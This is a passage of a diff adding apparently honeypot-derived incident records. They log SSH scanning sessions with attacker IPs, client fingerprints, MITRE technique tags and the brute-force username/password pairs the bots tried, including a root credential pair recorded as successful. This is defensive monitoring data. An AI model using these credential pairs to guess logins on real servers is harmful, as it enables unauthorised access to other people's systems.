+          "uuid": "4ceededc-1a01-11f1-b858-add93ad71686",
+          "timestamp": "2026-04-02T07:40:46.628448Z",
+          "src_ip": "112.221.175.214",
+          "protocol": "ssh",
+          "event": "cowrie.session.file_download"
+        },
+        {
+          "eventid": "cowrie.log.closed",
+          "ttylog": "var/lib/cowrie/tty/cc1eb03e9b5926d8076e25826664a04400de854bf5cc660fa35eb86cbdf7dc0f",
+          "size": 0,
+          "shasum": "cc1eb03e9b5926d8076e25826664a04400de854bf5cc660fa35eb86cbdf7dc0f",
+          "duplicate": true,
+          "duration": "0.1",
+          "uuid": "4ceededc-1a01-11f1-b858-add93ad71686",
+          "timestamp": "2026-04-02T07:40:46.629070Z",
+          "src_ip": "112.221.175.214",
+          "protocol": "ssh",
+          "event": "cowrie.log.closed"
+        },
+        {
+          "eventid": "cowrie.session.closed",
+          "duration": "4.4",
+          "uuid": "4ceededc-1a01-11f1-b858-add93ad71686",
+          "timestamp": "2026-04-02T07:40:49.444287Z",
+          "src_ip": "112.221.175.214",
+          "protocol": "ssh",
+          "event": "cowrie.session.closed"
+        }
+      ]
+    },
+    {
+      "case_id": "IR-6bde5075ba7a",
+      "src_ip": "112.221.175.214",
+      "first_seen": "2026-04-02T07:40:46.757777Z",
+      "last_seen": "2026-04-02T07:40:48.548854Z",
+      "duration_seconds": 1,
+      "login_attempts": 1,
+      "login_success": false,
+      "commands": [],
+      "downloads": [],
+      "ttps": [
+        "T1110.001",
+        "T1592"
+      ],
+      "severity": "LOW",
+      "timeline": [
+        {
+          "eventid": "cowrie.session.connect",
+          "src_ip": "112.221.175.214",
+          "src_port": 33372,
+          "dst_ip": "172.31.34.72",
+          "dst_port": 2222,
+          "protocol": "ssh",
+          "uuid": "4ceededc-1a01-11f1-b858-add93ad71686",
+          "timestamp": "2026-04-02T07:40:46.757777Z",
+          "event": "cowrie.session.connect"
+        },
+        {
+          "eventid": "cowrie.client.version",
+          "version": "SSH-2.0-libssh_0.11.1",
+          "uuid": "4ceededc-1a01-11f1-b858-add93ad71686",
+          "timestamp": "2026-04-02T07:40:46.759869Z",
+          "src_ip": "112.221.175.214",
+          "protocol": "ssh",
+          "event": "cowrie.client.version"
+        },
+        {
+          "eventid": "cowrie.client.kex",
+          "hassh": "03a80b21afa810682a776a7d42e5e6fb",
+          "hasshAlgorithms": "curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group18-sha512,diffie-hellman-group16-sha512,diffie-hellman-group-exchange-sha256,diffie-hellman-group14-sha256,ext-info-c,kex-strict-c-v00@openssh.com;chacha20-poly1305@openssh.com,aes256-gcm@openssh.com,aes128-gcm@openssh.com,aes256-ctr,aes192-ctr,aes128-ctr;hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha2-256,hmac-sha2-512;none,zlib@openssh.com",
+          "kexAlgs": [
+            "curve25519-sha256",
+            "curve25519-sha256@libssh.org",
+            "ecdh-sha2-nistp256",
+            "ecdh-sha2-nistp384",
+            "ecdh-sha2-nistp521",
+            "diffie-hellman-group18-sha512",
+            "diffie-hellman-group16-sha512",
+            "diffie-hellman-group-exchange-sha256",
+            "diffie-hellman-group14-sha256",
+            "ext-info-c",
+            "kex-strict-c-v00@openssh.com"
+          ],
+          "keyAlgs": [
+            "ssh-ed25519",
+            "ecdsa-sha2-nistp521",
+            "ecdsa-sha2-nistp384",
+            "ecdsa-sha2-nistp256",
+            "sk-ssh-ed25519@openssh.com",
+            "sk-ecdsa-sha2-nistp256@openssh.com",
+            "rsa-sha2-512",
+            "rsa-sha2-256"
+          ],
+          "encCS": [
+            "chacha20-poly1305@openssh.com",
+            "aes256-gcm@openssh.com",
+            "aes128-gcm@openssh.com",
+            "aes256-ctr",
+            "aes192-ctr",
+            "aes128-ctr"
+          ],
+          "macCS": [
+            "hmac-sha2-256-etm@openssh.com",
+            "hmac-sha2-512-etm@openssh.com",
+            "hmac-sha2-256",
+            "hmac-sha2-512"
+          ],
+          "compCS": [
+            "none",
+            "zlib@openssh.com"
+          ],
+          "langCS": [
+            ""
+          ],
+          "uuid": "4ceededc-1a01-11f1-b858-add93ad71686",
+          "timestamp": "2026-04-02T07:40:46.891427Z",
+          "src_ip": "112.221.175.214",
+          "protocol": "ssh",
+          "event": "cowrie.client.kex"
+        },
+        {
+          "eventid": "cowrie.login.failed",
+          "username": "345gs5662d34",
+          "password": "345gs5662d34",
+          "uuid": "4ceededc-1a01-11f1-b858-add93ad71686",
+          "timestamp": "2026-04-02T07:40:47.414271Z",
+          "src_ip": "112.221.175.214",
+          "protocol": "ssh",
+          "event": "cowrie.login.failed"
+        },
+        {
+          "eventid": "cowrie.session.closed",
+          "duration": "1.8",
+          "uuid": "4ceededc-1a01-11f1-b858-add93ad71686",
+          "timestamp": "2026-04-02T07:40:48.548854Z",
+          "src_ip": "112.221.175.214",
+          "protocol": "ssh",
+          "event": "cowrie.session.closed"
+        }
+      ]
+    },
+    {
+      "case_id": "IR-92e7c0ea067c",
+      "src_ip": "112.221.175.214",
+      "first_seen": "2026-04-02T07:40:48.673599Z",
+      "last_seen": "2026-04-02T07:40:49.443529Z",
+      "duration_seconds": 0,
+      "login_attempts": 1,
+      "login_success": true,
+      "commands": [],
+      "downloads": [],
+      "ttps": [
+        "T1078",
+        "T1592"
+      ],
+      "severity": "HIGH",
+      "timeline": [
+        {
+          "eventid": "cowrie.session.connect",
+          "src_ip": "112.221.175.214",
+          "src_port": 33376,
+          "dst_ip": "172.31.34.72",
+          "dst_port": 2222,
+          "protocol": "ssh",
+          "uuid": "4ceededc-1a01-11f1-b858-add93ad71686",
+          "timestamp": "2026-04-02T07:40:48.673599Z",
+          "event": "cowrie.session.connect"
+        },
+        {
+          "eventid": "cowrie.client.version",
+          "version": "SSH-2.0-libssh_0.11.1",
+          "uuid": "4ceededc-1a01-11f1-b858-add93ad71686",
+          "timestamp": "2026-04-02T07:40:48.675804Z",
+          "src_ip": "112.221.175.214",
+          "protocol": "ssh",
+          "event": "cowrie.client.version"
+        },
+        {
+          "eventid": "cowrie.client.kex",
+          "hassh": "03a80b21afa810682a776a7d42e5e6fb",
+          "hasshAlgorithms": "curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group18-sha512,diffie-hellman-group16-sha512,diffie-hellman-group-exchange-sha256,diffie-hellman-group14-sha256,ext-info-c,kex-strict-c-v00@openssh.com;chacha20-poly1305@openssh.com,aes256-gcm@openssh.com,aes128-gcm@openssh.com,aes256-ctr,aes192-ctr,aes128-ctr;hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha2-256,hmac-sha2-512;none,zlib@openssh.com",
+          "kexAlgs": [
+            "curve25519-sha256",
+            "curve25519-sha256@libssh.org",
+            "ecdh-sha2-nistp256",
+            "ecdh-sha2-nistp384",
+            "ecdh-sha2-nistp521",
+            "diffie-hellman-group18-sha512",
+            "diffie-hellman-group16-sha512",
+            "diffie-hellman-group-exchange-sha256",
+            "diffie-hellman-group14-sha256",
+            "ext-info-c",
+            "kex-strict-c-v00@openssh.com"
+          ],
+          "keyAlgs": [
+            "ssh-ed25519",
+            "ecdsa-sha2-nistp521",
+            "ecdsa-sha2-nistp384",
+            "ecdsa-sha2-nistp256",
+            "sk-ssh-ed25519@openssh.com",
+            "sk-ecdsa-sha2-nistp256@openssh.com",
+            "rsa-sha2-512",
+            "rsa-sha2-256"
+          ],
+          "encCS": [
+            "chacha20-poly1305@openssh.com",
+            "aes256-gcm@openssh.com",
+            "aes128-gcm@openssh.com",
+            "aes256-ctr",
+            "aes192-ctr",
+            "aes128-ctr"
+          ],
+          "macCS": [
+            "hmac-sha2-256-etm@openssh.com",
+            "hmac-sha2-512-etm@openssh.com",
+            "hmac-sha2-256",
+            "hmac-sha2-512"
+          ],
+          "compCS": [
+            "none",
+            "zlib@openssh.com"
+          ],
+          "langCS": [
+            ""
+          ],
+          "uuid": "4ceededc-1a01-11f1-b858-add93ad71686",
+          "timestamp": "2026-04-02T07:40:48.804481Z",
+          "src_ip": "112.221.175.214",
+          "protocol": "ssh",
+          "event": "cowrie.client.kex"
+        },
+        {
+          "eventid": "cowrie.login.success",
+          "username": "root",
+          "password": "3245gs5662d34",
+          "uuid": "4ceededc-1a01-11f1-b858-add93ad71686",
+          "timestamp": "2026-04-02T07:40:49.314229Z",
+          "src_ip": "112.221.175.214",
+          "protocol": "ssh",
+          "event": "cowrie.login.success"
+        },
+        {
+          "eventid": "cowrie.session.closed",
+          "duration": "0.8",
+          "uuid": "4ceededc-1a01-11f1-b858-add93ad71686",
+          "timestamp": "2026-04-02T07:40:49.443529Z",
+          "src_ip": "112.221.175.214",
+          "protocol": "ssh",
+          "event": "cowrie.session.closed"
+        }
+      ]
+    },
+    {
+      "case_id": "IR-fab4b7045f47",
+      "src_ip": "183.171.11.79",
+      "first_seen": "2026-04-02T07:42:18.838349Z",
+      "last_seen": "2026-04-02T07:42:22.077671Z",
+      "duration_seconds": 3,
+      "login_attempts": 0,
+      "login_success": false,
+      "commands": [],
+      "downloads": [],
+      "ttps": [],
+      "severity": "LOW",
+      "timeline": [
+        {
+          "eventid": "cowrie.session.connect",
+          "src_ip": "183.171.11.79",
+          "src_port": 47228,
+          "dst_ip": "172.31.34.72",
+          "dst_port": 2222,
+          "protocol": "ssh",
+          "uuid": "4ceededc-1a01-11f1-b858-add93ad71686",
+          "timestamp": "2026-04-02T07:42:18.838349Z",
+          "event": "cowrie.session.connect"
+        },
+        {
+          "eventid": "cowrie.session.closed",
+          "duration": "3.2",
+          "uuid": "4ceededc-1a01-11f1-b858-add93ad71686",
+          "timestamp": "2026-04-02T07:42:22.077671Z",
+          "src_ip": "183.171.11.79",
+          "protocol": "ssh",
+          "event": "cowrie.session.closed"
+        }
+      ]
+    },
+    {
+      "case_id": "IR-47303b824635",
+      "src_ip": "120.48.52.58",
+      "first_seen": "2026-04-02T07:48:47.002789Z",
+      "last_seen": "2026-04-02T07:50:47.063420Z",
+      "duration_seconds": 120,
+      "login_attempts": 0,
+      "login_success": false,
+      "commands": [],
+      "downloads": [],
+      "ttps": [
+        "T1592"
+      ],
+      "severity": "LOW",
+      "timeline": [
+        {
+          "eventid": "cowrie.session.connect",
+          "src_ip": "120.48.52.58",
+          "src_port": 55658,
+          "dst_ip": "172.31.34.72",
+          "dst_port": 2222,
+          "protocol": "ssh",
+          "uuid": "4ceededc-1a01-11f1-b858-add93ad71686",
+          "timestamp": "2026-04-02T07:48:47.002789Z",
+          "event": "cowrie.session.connect"
+        },
+        {
+          "eventid": "cowrie.client.version",
+          "version": "SSH-2.0-libssh_0.11.1",
+          "uuid": "4ceededc-1a01-11f1-b858-add93ad71686",
+          "timestamp": "2026-04-02T07:48:47.003425Z",
+          "src_ip": "120.48.52.58",
+          "protocol": "ssh",
+          "event": "cowrie.client.version"
+        },
+        {
+          "eventid": "cowrie.session.closed",
+          "duration": "120.1",
+          "uuid": "4ceededc-1a01-11f1-b858-add93ad71686",
+          "timestamp": "2026-04-02T07:50:47.063420Z",
+          "src_ip": "120.48.52.58",
+          "protocol": "ssh",
+          "event": "cowrie.session.closed"
+        }
+      ]
+    },
+    {
+      "case_id": "IR-97fba96ee7ab",
+      "src_ip": "65.20.205.197",
+      "first_seen": "2026-04-02T07:58:03.127990Z",
+      "last_seen": "2026-04-02T07:58:05.857122Z",
+      "duration_seconds": 2,
+      "login_attempts": 1,
+      "login_success": false,
+      "commands": [],
+      "downloads": [],
+      "ttps": [
+        "T1110.001",
+        "T1592"
+      ],
+      "severity": "LOW",
+      "timeline": [
+        {
+          "eventid": "cowrie.session.connect",
+          "src_ip": "65.20.205.197",
+          "src_port": 38254,
+          "dst_ip": "172.31.34.72",
+          "dst_port": 2222,
+          "protocol": "ssh",
+          "uuid": "4ceededc-1a01-11f1-b858-add93ad71686",
+          "timestamp": "2026-04-02T07:58:03.127990Z",
+          "event": "cowrie.session.connect"
+        },
+        {
+          "eventid": "cowrie.client.version",
+          "version": "SSH-2.0-OpenSSH_7.4",
+          "uuid": "4ceededc-1a01-11f1-b858-add93ad71686",
+          "timestamp": "2026-04-02T07:58:03.470911Z",
+          "src_ip": "65.20.205.197",
+          "protocol": "ssh",
+          "event": "cowrie.client.version"
+        },
+        {
+          "eventid": "cowrie.client.kex",
+          "hassh": "acaa53e0a7d7ac7d1255103f37901306",
+          "hasshAlgorithms": "diffie-hellman-group1-sha1,diffie-hellman-group14-sha1,diffie-hellman-group14-sha256,diffie-hellman-group16-sha512,diffie-hellman-group18-sha512,diffie-hellman-group-exchange-sha1,diffie-hellman-group-exchange-sha256,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,curve25519-sha256,curve25519-sha256@libssh.org,ext-info-c;des,3des,blowfish,none,3des-cbc,blowfish-cbc,cast128-cbc,arcfour,arcfour128,arcfour256,aes128-cbc,aes192-cbc,aes256-cbc,rijndael-cbc@lysator.liu.se,aes128-ctr,aes192-ctr,aes256-ctr,aes128-gcm@openssh.com,aes256-gcm@openssh.com,chacha20-poly1305@openssh.com;hmac-sha1,hmac-sha1-96,hmac-sha2-256,hmac-sha2-512,hmac-md5,hmac-md5-96,hmac-ripemd160,hmac-ripemd160@openssh.com,umac-64@openssh.com,umac-128@openssh.com,hmac-sha1-etm@openssh.com,hmac-sha1-96-etm@openssh.com,hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-md5-etm@openssh.com,hmac-md5-96-etm@openssh.com,hmac-ripemd160-etm@openssh.com,umac-64-etm@openssh.com,umac-128-etm@openssh.com;none,zlib@openssh.com,zlib",
+          "kexAlgs": [
+            "diffie-hellman-group1-sha1",
+            "diffie-hellman-group14-sha1",
+            "diffie-hellman-group14-sha256",
+            "diffie-hellman-group16-sha512",
+            "diffie-hellman-group18-sha512",
+            "diffie-hellman-group-exchange-sha1",
+            "diffie-hellman-group-exchange-sha256",
+            "ecdh-sha2-nistp256",
+            "ecdh-sha2-nistp384",
+            "ecdh-sha2-nistp521",
+            "curve25519-sha256",
+            "curve25519-sha256@libssh.org",
+            "ext-info-c"
+          ],
+          "keyAlgs": [
+            "ssh-ed25519",
+            "ssh-ed25519-cert-v01@openssh.com",
+            "ecdsa-sha2-nistp256",
+            "ecdsa-sha2-nistp256-cert-v01@openssh.com",
+            "ecdsa-sha2-nistp384",
+            "ecdsa-sha2-nistp384-cert-v01@openssh.com",
+            "ecdsa-sha2-nistp521",
+            "ecdsa-sha2-nistp521-cert-v01@openssh.com",
+            "ssh-rsa",
+            "ssh-rsa-cert-v01@openssh.com",
+            "ssh-dss",
+            "ssh-dss-cert-v01@openssh.com"
+          ],
+          "encCS": [
+            "des",
+            "3des",
+            "blowfish",
+            "none",
+            "3des-cbc",
+            "blowfish-cbc",
+            "cast128-cbc",
+            "arcfour",
+            "arcfour128",
+            "arcfour256",
+            "aes128-cbc",
+            "aes192-cbc",
+            "aes256-cbc",
+            "rijndael-cbc@lysator.liu.se",
+            "aes128-ctr",
+            "aes192-ctr",
+            "aes256-ctr",
+            "aes128-gcm@openssh.com",
+            "aes256-gcm@openssh.com",
+            "chacha20-poly1305@openssh.com"
+          ],
+          "macCS": [
+            "hmac-sha1",
+            "hmac-sha1-96",
+            "hmac-sha2-256",
+            "hmac-sha2-512",
+            "hmac-md5",
+            "hmac-md5-96",
+            "hmac-ripemd160",
+            "hmac-ripemd160@openssh.com",
+            "umac-64@openssh.com",
+            "umac-128@openssh.com",
+            "hmac-sha1-etm@openssh.com",
+            "hmac-sha1-96-etm@openssh.com",
+            "hmac-sha2-256-etm@openssh.com",
+            "hmac-sha2-512-etm@openssh.com",
+            "hmac-md5-etm@openssh.com",
+            "hmac-md5-96-etm@openssh.com",
+            "hmac-ripemd160-etm@openssh.com",
+            "umac-64-etm@openssh.com",
+            "umac-128-etm@openssh.com"
+          ],
+          "compCS": [
+            "none",
+            "zlib@openssh.com",
+            "zlib"
+          ],
+          "langCS": [
+            ""
+          ],
+          "uuid": "4ceededc-1a01-11f1-b858-add93ad71686",
+          "timestamp": "2026-04-02T07:58:03.471578Z",
+          "src_ip": "65.20.205.197",
+          "protocol": "ssh",
+          "event": "cowrie.client.kex"
+        },
+        {
+          "eventid": "cowrie.login.failed",
+          "username": "config",
+          "password": "222",
+          "uuid": "4ceededc-1a01-11f1-b858-add93ad71686",
+          "timestamp": "2026-04-02T07:58:04.473474Z",
+          "src_ip": "65.20.205.197",
+          "protocol": "ssh",
+          "event": "cowrie.login.failed"
+        },
+        {
+          "eventid": "cowrie.session.closed",
+          "duration": "2.7",
+          "uuid": "4ceededc-1a01-11f1-b858-add93ad71686",
+          "timestamp": "2026-04-02T07:58:05.857122Z",
+          "src_ip": "65.20.205.197",
+          "protocol": "ssh",
+          "event": "cowrie.session.closed"
+        }
+      ]
+    },
+    {
+      "case_id": "IR-e1061f71434b",
+      "src_ip": "177.72.118.30",
+      "first_seen": "2026-04-02T08:01:54.257679Z",
+      "last_seen": "2026-04-02T08:01:58.996590Z",
+      "duration_seconds": 4,
+      "login_attempts": 1,
+      "login_success": false,
+      "commands": [],
+      "downloads": [],
+      "ttps": [
+        "T1110.001",
+        "T1592"
+      ],
+      "severity": "LOW",
+      "timeline": [
+        {
+          "eventid": "cowrie.session.connect",
+          "src_ip": "177.72.118.30",
+          "src_port": 54356,
+          "dst_ip": "172.31.34.72",
+          "dst_port": 2222,
+          "protocol": "ssh",
+          "uuid": "4ceededc-1a01-11f1-b858-add93ad71686",
+          "timestamp": "2026-04-02T08:01:54.257679Z",
+          "event": "cowrie.session.connect"
+        },
+        {
+          "eventid": "cowrie.client.version",
+          "version": "SSH-2.0-OpenSSH_7.4",
+          "uuid": "4ceededc-1a01-11f1-b858-add93ad71686",
+          "timestamp": "2026-04-02T08:01:54.932354Z",
+          "src_ip": "177.72.118.30",
+          "protocol": "ssh",
+          "event": "cowrie.client.version"
+        },
+        {
+          "eventid": "cowrie.client.kex",
+          "hassh": "acaa53e0a7d7ac7d1255103f37901306",
+          "hasshAlgorithms": "diffie-hellman-group1-sha1,diffie-hellman-group14-sha1,diffie-hellman-group14-sha256,diffie-hellman-group16-sha512,diffie-hellman-group18-sha512,diffie-hellman-group-exchange-sha1,diffie-hellman-group-exchange-sha256,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,curve25519-sha256,curve25519-sha256@libssh.org,ext-info-c;des,3des,blowfish,none,3des-cbc,blowfish-cbc,cast128-cbc,arcfour,arcfour128,arcfour256,aes128-cbc,aes192-cbc,aes256-cbc,rijndael-cbc@lysator.liu.se,aes128-ctr,aes192-ctr,aes256-ctr,aes128-gcm@openssh.com,aes256-gcm@openssh.com,chacha20-poly1305@openssh.com;hmac-sha1,hmac-sha1-96,hmac-sha2-256,hmac-sha2-512,hmac-md5,hmac-md5-96,hmac-ripemd160,hmac-ripemd160@openssh.com,umac-64@openssh.com,umac-128@openssh.com,hmac-sha1-etm@openssh.com,hmac-sha1-96-etm@openssh.com,hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-md5-etm@openssh.com,hmac-md5-96-etm@openssh.com,hmac-ripemd160-etm@openssh.com,umac-64-etm@openssh.com,umac-128-etm@openssh.com;none,zlib@openssh.com,zlib",
+          "kexAlgs": [
+            "diffie-hellman-group1-sha1",
+            "diffie-hellman-group14-sha1",
+            "diffie-hellman-group14-sha256",
+            "diffie-hellman-group16-sha512",
+            "diffie-hellman-group18-sha512",
+            "diffie-hellman-group-exchange-sha1",
+            "diffie-hellman-group-exchange-sha256",
+            "ecdh-sha2-nistp256",
+            "ecdh-sha2-nistp384",
+            "ecdh-sha2-nistp521",
+            "curve25519-sha256",
+            "curve25519-sha256@libssh.org",
+            "ext-info-c"
+          ],
+          "keyAlgs": [
+            "ssh-ed25519",
+            "ssh-ed25519-cert-v01@openssh.com",
+            "ecdsa-sha2-nistp256",
+            "ecdsa-sha2-nistp256-cert-v01@openssh.com",
+            "ecdsa-sha2-nistp384",
+            "ecdsa-sha2-nistp384-cert-v01@openssh.com",
+            "ecdsa-sha2-nistp521",
+            "ecdsa-sha2-nistp521-cert-v01@openssh.com",
+            "ssh-rsa",
+            "ssh-rsa-cert-v01@openssh.com",
+            "ssh-dss",
+            "ssh-dss-cert-v01@openssh.com"
+          ],
+          "encCS": [
+            "des",
+            "3des",
+            "blowfish",
+            "none",
+            "3des-cbc",
+            "blowfish-cbc",
+            "cast128-cbc",
+            "arcfour",
+            "arcfour128",
+            "arcfour256",
+            "aes128-cbc",
+            "aes192-cbc",
+            "aes256-cbc",
+            "rijndael-cbc@lysator.liu.se",
+            "aes128-ctr",
+            "aes192-ctr",
+            "aes256-ctr",
+            "aes128-gcm@openssh.com",
+            "aes256-gcm@openssh.com",
+            "chacha20-poly1305@openssh.com"
+          ],
+          "macCS": [
+            "hmac-sha1",
+            "hmac-sha1-96",
+            "hmac-sha2-256",
+            "hmac-sha2-512",
+            "hmac-md5",
+            "hmac-md5-96",
+            "hmac-ripemd160",
+            "hmac-ripemd160@openssh.com",
+            "umac-64@openssh.com",
+            "umac-128@openssh.com",
+            "hmac-sha1-etm@openssh.com",
+            "hmac-sha1-96-etm@openssh.com",
+            "hmac-sha2-256-etm@openssh.com",
+            "hmac-sha2-512-etm@openssh.com",
+            "hmac-md5-etm@openssh.com",
+            "hmac-md5-96-etm@openssh.com",
+            "hmac-ripemd160-etm@openssh.com",
+            "umac-64-etm@openssh.com",
+            "umac-128-etm@openssh.com"
+          ],
+          "compCS": [
+            "none",
+            "zlib@openssh.com",
+            "zlib"
+          ],
+          "langCS": [
+            ""
+          ],
+          "uuid": "4ceededc-1a01-11f1-b858-add93ad71686",
+          "timestamp": "2026-04-02T08:01:54.933258Z",
+          "src_ip": "177.72.118.30",
+          "protocol": "ssh",
+          "event": "cowrie.client.kex"
+        },
+        {
+          "eventid": "cowrie.login.failed",
+          "username": "Blank",
+          "password": "159753",
+          "uuid": "4ceededc-1a01-11f1-b858-add93ad71686",
+          "timestamp": "2026-04-02T08:01:57.255637Z",
+          "src_ip": "177.72.118.30",
+          "protocol": "ssh",
+          "event": "cowrie.login.failed"
+        },
+        {
+          "eventid": "cowrie.session.closed",
+          "duration": "4.7",
+          "uuid": "4ceededc-1a01-11f1-b858-add93ad71686",
+          "timestamp": "2026-04-02T08:01:58.996590Z",
+          "src_ip": "177.72.118.30",
+          "protocol": "ssh",
+          "event": "cowrie.session.closed"
+        }
+      ]
+    },
+    {
+      "case_id": "IR-3f731b9f6d12",
+      "src_ip": "199.116.114.10",
+      "first_seen": "2026-04-02T08:16:20.365223Z",
+      "last_seen": "2026-04-02T08:18:20.375410Z",
+      "duration_seconds": 120,
+      "login_attempts": 0,
+      "login_success": false,
+      "commands": [],
+      "downloads": [],
+      "ttps": [],
+      "severity": "LOW",
+      "timeline": [
+        {
+          "eventid": "cowrie.session.connect",
+          "src_ip": "199.116.114.10",
+          "src_port": 60662,
+          "dst_ip": "172.31.34.72",
+          "dst_port": 2222,
+          "protocol": "ssh",
+          "uuid": "4ceededc-1a01-11f1-b858-add93ad71686",
+          "timestamp": "2026-04-02T08:16:20.365223Z",
+          "event": "cowrie.session.connect"
+        },
+        {
+          "eventid": "cowrie.session.closed",
+          "duration": "120.0",
+          "uuid": "4ceededc-1a01-11f1-b858-add93ad71686",
+          "timestamp": "2026-04-02T08:18:20.375410Z",
+          "src_ip": "199.116.114.10",
+          "protocol": "ssh",
+          "event": "cowrie.session.closed"
+        }
+      ]
+    },
+    {
+      "case_id": "IR-8bfe20e3450d",
+      "src_ip": "49.124.149.50",
+      "first_seen": "2026-04-02T08:16:43.020158Z",
+      "last_seen": "2026-04-02T08:16:46.149304Z",
+      "duration_seconds": 3,
+      "login_attempts": 1,
+      "login_success": false,
+      "commands": [],
+      "downloads": [],
+      "ttps": [
+        "T1110.001",
+        "T1592"
+      ],
+      "severity": "LOW",
+      "timeline": [
+        {
+          "eventid": "cowrie.session.connect",
+          "src_ip": "49.124.149.50",
+          "src_port": 58896,
+          "dst_ip": "172.31.34.72",
+          "dst_port": 2222,
+          "protocol": "ssh",
+          "uuid": "4ceededc-1a01-11f1-b858-add93ad71686",
+          "timestamp": "2026-04-02T08:16:43.020158Z",
+          "event": "cowrie.session.connect"
+        },
+        {
+          "eventid": "cowrie.client.version",
+          "version": "SSH-2.0-OpenSSH_7.4",
+          "uuid": "4ceededc-1a01-11f1-b858-add93ad71686",
+          "timestamp": "2026-04-02T08:16:43.425929Z",
+          "src_ip": "49.124.149.50",
+          "protocol": "ssh",
+          "event": "cowrie.client.version"
+        },
+        {
+          "eventid": "cowrie.client.kex",
+          "hassh": "acaa53e0a7d7ac7d1255103f37901306",
+          "hasshAlgorithms": "diffie-hellman-group1-sha1,diffie-hellman-group14-sha1,diffie-hellman-group14-sha256,diffie-hellman-group16-sha512,diffie-hellman-group18-sha512,diffie-hellman-group-exchange-sha1,diffie-hellman-group-exchange-sha256,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,curve25519-sha256,curve25519-sha256@libssh.org,ext-info-c;des,3des,blowfish,none,3des-cbc,blowfish-cbc,cast128-cbc,arcfour,arcfour128,arcfour256,aes128-cbc,aes192-cbc,aes256-cbc,rijndael-cbc@lysator.liu.se,aes128-ctr,aes192-ctr,aes256-ctr,aes128-gcm@openssh.com,aes256-gcm@openssh.com,chacha20-poly1305@openssh.com;hmac-sha1,hmac-sha1-96,hmac-sha2-256,hmac-sha2-512,hmac-md5,hmac-md5-96,hmac-ripemd160,hmac-ripemd160@openssh.com,umac-64@openssh.com,umac-128@openssh.com,hmac-sha1-etm@openssh.com,hmac-sha1-96-etm@openssh.com,hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-md5-etm@openssh.com,hmac-md5-96-etm@openssh.com,hmac-ripemd160-etm@openssh.com,umac-64-etm@openssh.com,umac-128-etm@openssh.com;none,zlib@openssh.com,zlib",
+          "kexAlgs": [
+            "diffie-hellman-group1-sha1",
+            "diffie-hellman-group14-sha1",
+            "diffie-hellman-group14-sha256",
+            "diffie-hellman-group16-sha512",
+            "diffie-hellman-group18-sha512",
+            "diffie-hellman-group-exchange-sha1",
+            "diffie-hellman-group-exchange-sha256",
+            "ecdh-sha2-nistp256",
+            "ecdh-sha2-nistp384",
+            "ecdh-sha2-nistp521",
+            "curve25519-sha256",
+            "curve25519-sha256@libssh.org",
+            "ext-info-c"
+          ],
+          "keyAlgs": [
+            "ssh-ed25519",
+            "ssh-ed25519-cert-v01@openssh.com",
+            "ecdsa-sha2-nistp256",
+            "ecdsa-sha2-nistp256-cert-v01@openssh.com",
+            "ecdsa-sha2-nistp384",
+            "ecdsa-sha2-nistp384-cert-v01@openssh.com",
+            "ecdsa-sha2-nistp521",
+            "ecdsa-sha2-nistp521-cert-v01@openssh.com",
+            "ssh-rsa",
+            "ssh-rsa-cert-v01@openssh.com",
+            "ssh-dss",
+            "ssh-dss-cert-v01@openssh.com"
+          ],
+          "encCS": [
+            "des",
+            "3des",
+            "blowfish",
+            "none",
+            "3des-cbc",
+            "blowfish-cbc",
+            "cast128-cbc",
+            "arcfour",
+            "arcfour128",
+            "arcfour256",
+            "aes128-cbc",
+            "aes192-cbc",
+            "aes256-cbc",
+            "rijndael-cbc@lysator.liu.se",
+            "aes128-ctr",
+            "aes192-ctr",
+            "aes256-ctr",
+            "aes128-gcm@openssh.com",
+            "aes256-gcm@openssh.com",
+            "chacha20-poly1305@openssh.com"
+          ],
+          "macCS": [
+            "hmac-sha1",
+            "hmac-sha1-96",
+            "hmac-sha2-256",
+            "hmac-sha2-512",
+            "hmac-md5",
+            "hmac-md5-96",
+            "hmac-ripemd160",
+            "hmac-ripemd160@openssh.com",
+            "umac-64@openssh.com",
+            "umac-128@openssh.com",
+            "hmac-sha1-etm@openssh.com",
+            "hmac-sha1-96-etm@openssh.com",
+            "hmac-sha2-256-etm@openssh.com",
+            "hmac-sha2-512-etm@openssh.com",
+            "hmac-md5-etm@openssh.com",
+            "hmac-md5-96-etm@openssh.com",
+            "hmac-ripemd160-etm@openssh.com",
+            "umac-64-etm@openssh.com",
+            "umac-128-etm@openssh.com"
+          ],
+          "compCS": [
+            "none",
+            "zlib@openssh.com",
+            "zlib"
+          ],
+          "langCS": [
+            ""
+          ],
+          "uuid": "4ceededc-1a01-11f1-b858-add93ad71686",
+          "timestamp": "2026-04-02T08:16:43.426675Z",
+          "src_ip": "49.124.149.50",
+          "protocol": "ssh",
+          "event": "cowrie.client.kex"
+        },
+        {
+          "eventid": "cowrie.login.failed",
+          "username": "Supervisor",
+          "password": "123456789",
+          "uuid": "4ceededc-1a01-11f1-b858-add93ad71686",
+          "timestamp": "2026-04-02T08:16:44.769628Z",
+          "src_ip": "49.124.149.50",
+          "protocol": "ssh",
+          "event": "cowrie.login.failed"
+        },
+        {
+          "eventid": "cowrie.session.closed",
+          "duration": "3.1",
+          "uuid": "4ceededc-1a01-11f1-b858-add93ad71686",
+          "timestamp": "2026-04-02T08:16:46.149304Z",
+          "src_ip": "49.124.149.50",
+          "protocol": "ssh",
+          "event": "cowrie.session.closed"
+        }
+      ]
+    },
+    {
+      "case_id": "IR-84dcec795c9a",
+      "src_ip": "112.28.73.142",
+      "first_seen": "2026-04-02T08:21:40.739556Z",
+      "last_seen": "2026-04-02T08:21:45.050968Z",
+      "duration_seconds": 4,
+      "login_attempts": 1,
+      "login_success": false,
+      "commands": [],
+      "downloads": [],
+      "ttps": [
+        "T1110.001",
+        "T1592"
+      ],
